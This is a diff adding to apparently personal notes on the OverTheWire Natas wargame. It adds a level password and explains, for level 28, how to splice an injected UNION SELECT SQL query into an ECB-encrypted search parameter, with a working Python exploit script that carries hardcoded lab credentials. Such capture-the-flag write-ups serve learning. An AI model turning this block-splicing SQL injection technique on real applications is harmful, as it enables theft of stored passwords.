@@ -16,6 +16,7 @@ MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
 ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
 26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
 28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
+29: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
 
 check /files
 check /robots.txt
@@ -409,3 +410,41 @@ after URL and b64 decoding these `"\x89\x0cL\xf2\xfa\xfa'\xc5(\x8b\xe1\x8eS5\xe5
 if we add more than 10 characters, we will go for the next block.
 
 then if we try punctuation, we will have different stuff afterward. on `'"\`
+
+so from here, we can encrypt whatever we want like this:
+
+`'A' * 9 + "' Union select password from users;#"` => the previous block will be closed, and then we will have a new block (and more).
+
+the first 48 and last 32 characters don't matter. whatever in between will be our cipher.
+
+but the important thing is that we will have to inject this into the original cipher.
+
+original cipher: `<first 2 blocks> <some unknown characters + our search query> <the ending stuff>`
+injection:       `<first 3 blocks> our injected sql query <the ending stuff>`
+
+so we will just expand the original query with union statement.
+
+The program will insert a / and this will push the ‘ into the next block (since it takes 10 characters to fill up the block, 9 `A`‘s and a `/` = 10 chars
+
+```python
+import requests
+from urllib.parse import unquote, quote
+from base64 import b64decode, b64encode
+
+s = requests.Session()
+url = "http://natas28.natas.labs.overthewire.org/index.php"
+s.auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')
+
+base = s.post(url, data={"query": 10 * 'A'})
+base = b64decode(unquote(base.url.split("=")[1]))
+
+sample = 'A' * 9 + "' Union select password from users;#"
+
+r = s.post(url, data={"query": sample})
+query = b64decode(unquote(r.url.split("=")[1]))[48:-32]
+final = base[:48] + query + base[48:]
+print(quote(b64encode(final)))
+```
+
+## natas 29
+
